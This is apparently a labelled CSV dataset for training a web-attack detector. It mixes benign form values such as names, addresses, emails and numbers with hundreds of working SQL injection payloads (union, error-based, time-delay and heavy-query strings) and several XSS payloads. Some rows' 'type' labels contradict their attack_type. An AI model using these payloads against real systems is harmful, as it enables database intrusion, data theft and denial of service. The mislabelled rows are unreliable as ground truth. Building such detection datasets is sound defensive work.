Text,attack_type,Label,type
1)));select (case when (2830=7046) then 2830 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
retinte,norm,0,normal
"1"") as ymsc where 3694=3694 waitfor delay '0:0:5'--",sqli,1,sql
36357,norm,0,normal
"-5581%'))) union all select 4266,4266,4266,4266,4266,4266,4266,4266,4266,4266#",sqli,1,sql
"1)) as rqbo where 2243=2243 and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1,sql
19361,norm,0,normal
">""&{document.cookie=true;};",xss,2,sql
8217,norm,0,normal
5256575784174966,norm,0,normal
brot calderer,norm,0,normal
0512840344034121,norm,0,normal
40142,norm,0,normal
o.sulliv,norm,0,normal
"-7741') where 8271=8271 union all select 8271,8271,8271,8271,8271,8271,8271#",sqli,1,sql
02ap36o5473,norm,0,normal
horst@engibraltar.com.co,norm,0,normal
6588349336548778,norm,0,normal
comparaz albareda,norm,0,normal
at89a7218,norm,0,normal
inocencio,norm,0,normal
65223156d,norm,0,normal
"-3151%""))) union all select 6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",sqli,1,sql
9962031188070357,norm,0,normal
"1))) or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
g89273t2,norm,0,normal
"1"" and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual) and ""xyjg""=""xyjg",sqli,1,sql
cea,norm,0,normal
loraine,norm,0,normal
"1') where 2808=2808;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
-7663')) or 1558=1104 and (('wsrq'='wsrq,sqli,1,normal
nype.shafer@canovash.bv,norm,0,normal
4150902070293588,norm,0,normal
quebrantamiento,norm,0,normal
"-9977"" where 5132=5132 union all select 5132--",sqli,1,sql
cuero slachevsky,norm,0,normal
"<body background=""javascript:document.cookie=true;"">",xss,2,xss
18440,norm,0,normal
"1""))) and 4241=convert(int,(select char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (4241=4241) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))) and (((""fktl""=""fktl",sqli,1,sql
ben,norm,0,normal
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null)",sqli,1,sql
"-1<div style=""width: expression(document.cookie=true);"">",xss,2,sql
mao,norm,0,normal
garabana belart,norm,0,normal
77447105x,norm,0,normal
"romejal carrascal, 48, 3?d",norm,0,normal
12450,norm,0,normal
space3,norm,0,normal
kovacs,norm,0,normal
brait_burbridge@fichajes.nom.ic,norm,0,normal
03769,norm,0,normal
ob1et7nt9,norm,0,normal
24520,norm,0,normal
uriz carmona,norm,0,normal
8016,norm,0,normal
oti sineiro,norm,0,normal
cejadero,norm,0,normal
25138,norm,0,normal
0esh6red32,norm,0,normal
7380832792617774,norm,0,normal
-8652') or 4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4747=4747) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1,sql
gisela,norm,0,normal
deyecta,norm,0,normal
4228,norm,0,normal
"1"")) rlike sleep(5)#",sqli,1,normal
hattar4,norm,0,normal
ysero,norm,0,normal
diana,norm,0,normal
1));begin dbms_lock.sleep(5); end--,sqli,1,sql
1) where 7165=7165 and sleep(5)#,sqli,1,normal
cho5readu3a,norm,0,normal
"-1236'+(select 'fbgh' where 3896=3896 union all select 3896,3896,3896,3896,3896,3896,3896,3896,3896--",sqli,1,sql
v5964,norm,0,normal
l680jis45,norm,0,normal
6920006006312240,norm,0,normal
58261127b,norm,0,normal
"1' where 6533=6533;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",sqli,1,sql
"1))) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (((5199=5199",sqli,1,sql
"1) and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (8450=8450",sqli,1,sql
flo hosta,norm,0,normal
09620,norm,0,normal
1616372290500917,norm,0,normal
-3998')) or 3038=3038,sqli,1,normal
deimos 147 12?a,norm,0,normal
1%')) and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
9886608978335494,norm,0,normal
4,norm,0,normal
1%') waitfor delay '0:0:5' and ('%'=',sqli,1,normal
revuelta borgua,norm,0,normal
"c/ la haya, 109 13-d",norm,0,normal
37329,norm,0,normal
6074,norm,0,normal
"1) where 7485=7485 and make_set(8403=8403,8899)--",sqli,1,sql
renta,norm,0,normal
"1%"");select sleep(5)#",sqli,1,sql
75512816k,norm,0,normal
lemoiz,norm,0,normal
48102,norm,0,normal
"1)) as myyh where 5116=5116 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
"1"";select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",sqli,1,sql
a6ordab07,norm,0,normal
2777667912628191,norm,0,normal
"1)) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and ((4048=4048",sqli,1,sql
"c/ fontanelles, 196,",norm,0,normal
"1"" where 2886=2886;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
"1"") where 1793=1793;select (case when (5390=7419) then 5390 else 5390*(select 5390 from mysql.db) end)#",sqli,1,sql
oblak,norm,0,normal
"travesia san lazaro, 86",norm,0,normal
teobaldo,norm,0,normal
"1""));call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((""squx"" like ""squx",sqli,1,sql
urbina granda,norm,0,normal
efrain,norm,0,normal
22496795n,norm,0,normal
<script>a=/xss/nalert('xss');</script>,xss,2,xss
kwangchi,norm,0,normal
38,norm,0,normal
desapercib.idamente,norm,0,normal
05072293b,norm,0,normal
(select (case when (6714=8872) then 1 else 6714*(select 6714 from master..sysdatabases) end)),sqli,1,sql
1) as msat where 1267=1267;select case when 3661=9315 then 1 else null end--,sqli,1,sql
"-4596"" union all select 5761#",sqli,1,sql
legarreta sant,norm,0,normal
"1"" and 7533=7533 and ""dqjp""=""dqjp",sqli,1,normal
"1"") where 9855=9855;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#",sqli,1,sql
4358,norm,0,normal
6188,norm,0,normal
294r1152ar,norm,0,normal
"1'+(select 'mxlb' where 4900=4900;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))+'",sqli,1,sql
shoemake,norm,0,normal
hrcules,norm,0,normal
"1) as azdb where 4219=4219 union all select null,null,null,null#",sqli,1,sql
79,norm,0,normal
"-6145'+(select nnjn where 1389=1389 union all select 1389,1389,1389--",sqli,1,sql
-7773' or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,1,sql
villanueva gualano,norm,0,normal
"1')) as oocd where 2919=2919 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-2959"" union all select 3414,3414,3414,3414,3414,3414,3414,3414#",sqli,1,sql
1%' and 6454=8348 and '%'=',sqli,1,normal
"1%""))) or row(1045,7562)>(select count(*),concat(0x7171706a71,(select (elt(1045=1045,1))),0x717a767a71,floor(rand(0)*2))x from (select 8488 union select 5584 union select 3051 union select 1210)a group by x) and (((""%""=""",sqli,1,sql
"1',(select (case when (5586=6403) then 1 else 5586*(select 5586 from mysql.db) end))",sqli,1,sql
moll aybar,norm,0,normal
28515,norm,0,normal
"-9659))) union all select 8665,8665,8665,8665,8665,8665,8665--",sqli,1,sql
"1' union all select null,null,null,null,null,null,null,null,null#",sqli,1,sql
8776,norm,0,normal
3423,norm,0,normal
"c/ narcisa freixas, 61 13?h",norm,0,normal
abigael,norm,0,normal
ayyuce,norm,0,normal
sofronio,norm,0,normal
"1"")) rlike (select (case when (7689=7689) then 1 else 0x28 end)) and ((""ladc"" like ""ladc",sqli,1,sql
-3535%'))) or 5605=4660 and ((('%'=',sqli,1,normal
puente de montaana,norm,0,normal
"1'||(select 'bhxx' where 2585=2585;select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
sotalugo,norm,0,normal
aragons,norm,0,normal
1 where 7452=7452 or 4240=(select 4240 from pg_sleep(5))--,sqli,1,sql
5a09la,norm,0,normal
45794073s,norm,0,normal
"1%"")));select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
polli7o,norm,0,normal
1'+(select hett where 7228=7228;waitfor delay '0:0:5')+',sqli,1,sql
baff@enhierro.com.ec,norm,0,normal
"calle las artes, 90,",norm,0,normal
"<img id=xss src=`javascript:alert(""rsnake says, 'xss'"")`>",xss,2,xss
2692,norm,0,normal
aimarsen@enla.gi,norm,0,normal
"1') where 8167=8167;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
"-6733') where 4024=4024 union all select 4024,4024,4024,4024#",sqli,1,sql
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('pnst'='pnst",sqli,1,sql
"1"") or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and (""ureu"" like ""ureu",sqli,1,sql
"1%')) and updatexml(3393,concat(0x2e,0x7171706a71,(select (elt(3393=3393,1))),0x717a767a71),1161) and (('%'='",sqli,1,sql
rong,norm,0,normal
tricentenario,norm,0,normal
fazenda_heigh@unanuevavisionenortodoncia.gh,norm,0,normal
"1'))) or 8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1,normal
gunner@piaceredelivery.kw,norm,0,normal
"1"" and 1668=8288",sqli,1,normal
colleta,norm,0,normal
5764,norm,0,normal
"1""))) and 9198=9198--",sqli,1,sql
"1)) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ((3038=3038",sqli,1,sql
lemoine5@informatica2009.zr,norm,0,normal
1 and 9122=4153# nxcv,sqli,1,normal
senen,norm,0,normal
-8809'||(select 'hyzr' where 5694=5694 union all select 5694--,sqli,1,sql
37724,norm,0,normal
"1') or 4411=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and ('edcm' like 'edcm",sqli,1,sql
paterson,norm,0,normal
"1))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
"1"") where 3507=3507;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
-2823')) or 5663=4228 and (('skgh' like 'skgh,sqli,1,normal
canino,norm,0,normal
bateman@alojesuweb.in,norm,0,normal
1)) as jvvs where 9594=9594;select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
5212720427288459,norm,0,normal
"1%"")) or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
-2504'))) or 8723=9715,sqli,1,normal
"1')))(select (case when (5451=5451) then regexp_substring(repeat(right(char(5451),0),500000000),null) else char(108)||char(76)||char(112)||char(116) end) from information_schema.system_users) and ((('javh'='javh",sqli,1,sql
martinn sampayo,norm,0,normal
6849,norm,0,normal
65886361d,norm,0,normal
1%') union all select null--,sqli,1,sql
"1%"") and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
maiga,norm,0,normal
6105002331503043,norm,0,normal
1)) as mlpf where 7425=7425;select sleep(5)--,sqli,1,sql
"1%'))) union all select null,null,null,null#",sqli,1,sql
"1))) and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and (((2997=2997",sqli,1,normal
cholgua,norm,0,normal
46388,norm,0,normal
tiena,norm,0,normal
"1'))) and 8514=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and ((('zoxm' like 'zoxm",sqli,1,sql
parkin,norm,0,normal
juha,norm,0,normal
"1'||(select 'bzxa' where 6320=6320;select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)||'",sqli,1,sql
62123000t,norm,0,normal
"1')) and 6510=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7) and (('tqpj'='tqpj",sqli,1,sql
"1',(select (case when (5777=5777) then 1 else cast(1 as int)/(select 0 from dual) end) from dual)",sqli,1,sql
1';select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
gullera,norm,0,normal
"1) where 8008=8008 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
1' and 4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4386=4386) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and 'ymnm'='ymnm,sqli,1,sql
59072549q,norm,0,normal
3929,norm,0,normal
decour raichs,norm,0,normal
"1') as dwgv where 1525=1525 union all select null,null--",sqli,1,sql
despacha!do,norm,0,normal
riumors,norm,0,normal
"1 where 1656=1656 and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
erhard@miplat.il,norm,0,normal
gazof!ilacio,norm,0,normal
1' or (select * from (select(sleep(5)))ydpu),sqli,1,sql
"1%';select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"barcelona 149, 5-e",norm,0,normal
giralda,norm,0,normal
4771,norm,0,normal
l0cianesco,norm,0,normal
"cartago 117, 12?b",norm,0,normal
17923027r,norm,0,normal
1') where 8086=8086 and 1430=7941--,sqli,1,sql
castellnovo,norm,0,normal
aristin,norm,0,normal
"1%""))) and 8312=dbms_pipe.receive_message(chr(69)||chr(79)||chr(101)||chr(68),5)--",sqli,1,sql
berriz,norm,0,normal
batido,norm,0,normal
"-3321"" where 1603=1603 union all select 1603,1603,1603,1603#",sqli,1,sql
"1""))) and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
ola,norm,0,normal
ersil,norm,0,normal
"1"" union all select null,null,null,null,null--",sqli,1,sql
c/ agachadilla 81,norm,0,normal
"1"" where 1115=1115 or 8384=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
07313,norm,0,normal
50236,norm,0,normal
"1%'))) or char(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ((('%'='",sqli,1,normal
46702832k,norm,0,normal
"-1<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">",xss,2,xss
2795669644881744,norm,0,normal
04740,norm,0,normal
"-6720'))) or 5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (5023=5023) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ((('enfe' like 'enfe",sqli,1,sql
"1"")) and 3707=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3) and ((""uglh"" like ""uglh",sqli,1,sql
62573420b,norm,0,normal
plazuela de la fuente cantero 124,norm,0,normal
72367579b,norm,0,normal
"1) and 8407=(select count(*) from generate_series(1,5000000))",sqli,1,sql
41t1lecti22,norm,0,normal
borsodi-heintje@unidadesdeventilacion.tg,norm,0,normal
127ca3o,norm,0,normal
vanera,norm,0,normal
2300,norm,0,normal
1')));select (case when (9246=6326) then 9246 else 9246*(select 9246 from mysql.db) end)#,sqli,1,sql
cha$9i74r0,norm,0,normal
"1"") as klur where 7046=7046 and 3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
etxebarria,norm,0,normal
28177i6sa,norm,0,normal
28343275f,norm,0,normal
francis@ocymafa.tt,norm,0,normal
1' where 2183=2183;select (case when (3855=3855) then 3855 else 1/(select 0) end)--,sqli,1,sql
"-3865"") where 3559=3559 union all select 3559,3559,3559,3559,3559,3559,3559--",sqli,1,sql
24443,norm,0,normal
45263368n,norm,0,normal
rod,norm,0,normal
96110447w,norm,0,normal
33001,norm,0,normal
"1'||(select 'scqw' where 3337=3337 or 7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1,sql
1) where 7956=7956 or sleep(5)#,sqli,1,normal
"calle tremp, 196 11?g",norm,0,normal
"-8608"" or 5460=4461--",sqli,1,sql
busoms redolad,norm,0,normal
1%')) rlike sleep(5)#,sqli,1,normal
kubrick.blessed@suardistec.ee,norm,0,normal
"c/ obispo alonso suarez, 163,",norm,0,normal
micr6pil8,norm,0,normal
"ametlla de mar, l'",norm,0,normal
calle capitan palacios 71,norm,0,normal
-6757'))) or 4524=3696,sqli,1,normal
pimienta rosas,norm,0,normal
1) and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (9932=9932,sqli,1,sql
"1) where 5464=5464 or 1022=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5)--",sqli,1,sql
49394,norm,0,normal
"-8005"") union all select 5213,5213,5213,5213,5213--",sqli,1,sql
4087914907992137,norm,0,normal
"-7078'||(select 'lcza' where 5076=5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",sqli,1,sql
andrease,norm,0,normal
ramallo cabarcos,norm,0,normal
"1%') and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1 union all select null,null,null#",sqli,1,sql
"c/ el salvador 199, 9-a",norm,0,normal
"1%"")));select count(*) from generate_series(1,5000000)--",sqli,1,sql
"purpurania, 79 3?b",norm,0,normal
"-3379) union all select 4985,4985,4985,4985,4985,4985,4985,4985,4985,4985--",sqli,1,sql
6h11a3rud9,norm,0,normal
taxcea,norm,0,normal
bloc castanyer 3,norm,0,normal
menna4,norm,0,normal
"1%' union all select null,null,null,null,null--",sqli,1,sql
barlas,norm,0,normal
"1) or 7552=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)",sqli,1,sql
vegas del genil,norm,0,normal
"1)) as gdcg where 2329=2329 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
"1) or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)",sqli,1,sql
moscoso mesen,norm,0,normal
torremoroso enrich,norm,0,normal
ferreruela,norm,0,normal
carretera rubi 106,norm,0,normal
emad,norm,0,normal
4030398318773720,norm,0,normal
08250,norm,0,normal
03180,norm,0,normal
"c/ barri del polvori, 77",norm,0,normal
efran,norm,0,normal
"1') as tsge where 6970=6970;select count(*) from generate_series(1,5000000)--",sqli,1,sql
hollingw,norm,0,normal
"1'));select * from generate_series(7407,7407,case when (7407=6562) then 1 else 0 end) limit 1--",sqli,1,sql
mamukos4@culturalsanpedrocf.uk,norm,0,normal
garrovillas de alcontar,norm,0,normal
5,norm,0,normal
44161,norm,0,normal
"1%') union all select null,null,null,null,null,null,null,null--",sqli,1,sql
-5336') where 8691=8691 or 3608=1887--,sqli,1,sql
"1'))) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ((('ewwi'='ewwi",sqli,1,sql
"1%"") and 7533=7533 and (""%""=""",sqli,1,normal
maridel,norm,0,normal
silcula,norm,0,normal
"1"") and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (""rvub"" like ""rvub",sqli,1,sql
marysia-paramor@programaciones.com.mg,norm,0,normal
alfaro esparraguera,norm,0,normal
novalbos illarraga,norm,0,normal
condal talero,norm,0,normal
macinnes,norm,0,normal
-9484' or (7129=2349)*2349 and 'fcsa' like 'fcsa,sqli,1,normal
"1) and make_set(1559=4863,4863)",sqli,1,normal
0588792998295469,norm,0,normal
"ronda outeiro, 13",norm,0,normal
"calle andres mellado, 83, 12-d",norm,0,normal
"1%"";select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
buckner0,norm,0,normal
32,norm,0,normal
menchaca,norm,0,normal
"1' where 6406=6406;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1' where 7417=7417 and 8407=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
mckee,norm,0,normal
"1"")));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
43,norm,0,normal
sothern@asesoriaviesca.nc,norm,0,normal
blotta azagra,norm,0,normal
vinasco pomar,norm,0,normal
19255762r,norm,0,normal
1 where 2672=2672 and 1819=4322#,sqli,1,normal
shail@arrsys.mz,norm,0,normal
weinberger@privatebanking.com.nz,norm,0,normal
striebeck.magnuson@alpesfranceses.com.im,norm,0,normal
hartzenbusch 98,norm,0,normal
tornagua,norm,0,normal
"1') and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and ('xonc'='xonc",sqli,1,sql
54709157t,norm,0,normal
"1"" where 3018=3018 or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1,sql
hassold,norm,0,normal
06145837f,norm,0,normal
"c/ leopoldo alas ""clarin"" 4, 6?b",norm,0,normal
"1') procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1) and ('eiau'='eiau",sqli,1,sql
40592671v,norm,0,normal
t8r0en,norm,0,normal
"1 where 7522=7522 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
landau silvestre,norm,0,normal
9201759661755850,norm,0,normal
jorge paquirachi,norm,0,normal
2875307129391244,norm,0,normal
1646326838248937,norm,0,normal
12414,norm,0,normal
espinosa de villagonzalo,norm,0,normal
boar,norm,0,normal
"<style>body{-moz-binding:url(""http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting"")}</style>",xss,2,normal
1%' and 7366=9197#,sqli,1,normal
potentado,norm,0,normal
"<img src='vbscript:msgbox(""crosssitescripting"")'>",xss,2,normal
-8963) where 8528=8528 or (2470=3271)*3271--,sqli,1,sql
1) as uuro where 6784=6784;if(7899=7899) select 7899 else drop function zbbp--,sqli,1,sql
"-4465%' union all select 6196,6196,6196,6196,6196,6196,6196,6196--",sqli,1,sql
1 rlike (select (case when (6795=5898) then 1 else 0x28 end))-- xdkx,sqli,1,sql
"1"") as sraw where 1997=1997 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
"1)) as rual where 4649=4649 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))--",sqli,1,sql
8198356178876064,norm,0,normal
laws cabezon,norm,0,normal
"1""))) or (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(8113=8113,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610))) and (((""twpn"" like ""twpn",sqli,1,sql
helen-el,norm,0,normal
gladstei,norm,0,normal
"1"";waitfor delay '0:0:5' and ""lhcv""=""lhcv",sqli,1,sql
1) where 1120=1120;select (case when (3716=4021) then 3716 else 3716*(select 3716 from information_schema.character_sets) end)#,sqli,1,sql
"1"")));call regexp_substring(repeat(right(char(3702),0),500000000),null) and (((""xxug""=""xxug",sqli,1,sql
"1') and char(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null) and ('rqyz'='rqyz",sqli,1,normal
vilagut victori,norm,0,normal
feist8,norm,0,normal
karzau@asdn.edu,norm,0,normal
"1))) union all select null,null,null,null,null,null#",sqli,1,sql
17103014f,norm,0,normal
08170,norm,0,normal
starr-fjelmose@cdgranadabaila.travel,norm,0,normal
gwennie,norm,0,normal
dasonmica,norm,0,normal
4927525514155816,norm,0,normal
"fernandez latorre 14,",norm,0,normal
05202,norm,0,normal
">""<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>",xss,2,xss
40191,norm,0,normal
mialgi5,norm,0,normal
-6823'))) or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) and ((('lwlk' like 'lwlk,sqli,1,sql
"<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",xss,2,xss
"1' where 1917=1917 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
horton@beautifulbody.it,norm,0,normal
1091303634326853,norm,0,normal
"1"") where 7950=7950 and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"rio alzania, 72, 6g",norm,0,normal
quint,norm,0,normal
"1"") where 9570=9570 rlike (select (case when (1642=3686) then 1 else 0x28 end))--",sqli,1,sql
"1%"")));select (case when (4769=4769) then 4769 else 4769*(select 4769 from mysql.db) end)#",sqli,1,sql
hartmann@softstylestudio.sa,norm,0,normal
"1%"" or updatexml(1808,concat(0x2e,0x7171706a71,(select (elt(1808=1808,1))),0x717a767a71),8666) and ""%""=""",sqli,1,sql
"pl. los oficios, 181 12?d",norm,0,normal
"1"") or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
abordonar,norm,0,normal
-8248 or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq'),sqli,1,sql
"1') or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ('ireg' like 'ireg",sqli,1,sql
curul,norm,0,normal
aliseda,norm,0,normal
karels,norm,0,normal
r4a8e3a,norm,0,normal
2253152365761758,norm,0,normal
"1') as zdhq where 5586=5586;select like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
rodo de la cerda,norm,0,normal
37788,norm,0,normal
"saavedra fajardo s/n, 3-h",norm,0,normal
thompson,norm,0,normal
"1"" where 7015=7015 procedure analyse(extractvalue(5840,concat(0x5c,0x7171706a71,(select (case when (5840=5840) then 1 else 0 end)),0x717a767a71)),1)--",sqli,1,sql
"calle matula, s/n,",norm,0,normal
duljit,norm,0,normal
sant lloren de la muga,norm,0,normal
"1%"" and 7533=7533 and ""%""=""",sqli,1,normal
banerjee6@getgold.ec,norm,0,normal
1%'));(select * from (select(sleep(5)))acdk)#,sqli,1,sql
11112430a,norm,0,normal
22268,norm,0,normal
"1"" or 6793=(select 6793 from pg_sleep(5)) and ""kojr""=""kojr",sqli,1,sql
bethania,norm,0,normal
"calle juan sebastian elcano, 157 11?b",norm,0,normal
0639487553835350,norm,0,normal
masao,norm,0,normal
